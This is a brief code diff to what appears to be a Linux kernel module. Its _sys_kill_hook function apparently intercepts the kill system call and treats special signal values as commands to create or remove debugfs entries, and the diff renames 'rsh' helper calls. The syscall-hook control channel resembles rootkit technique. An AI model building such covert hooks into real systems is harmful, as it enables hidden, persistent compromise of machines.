@@ -32,7 +32,7 @@ static notrace asmlinkage int _sys_kill_hook(int pid, int sig)
 			return 0;
 
 		case HTM_SIG_DISABLE_DEBUGFS:
-			htm_debugfs_rsh_remove();
+			htm_debugfs_remove_all();
 			return 0;
 
 		case HTM_SIG_DISABLE_FS:
@@ -49,7 +49,7 @@ static notrace asmlinkage int _sys_kill_hook(int pid, int sig)
 			return 0;
 
 		case HTM_SIG_ENABLE_DEBUGFS:
-			htm_debugfs_rsh_create();
+			htm_debugfs_create_all();
 			return 0;
 
 		case HTM_SIG_ENABLE_FS:
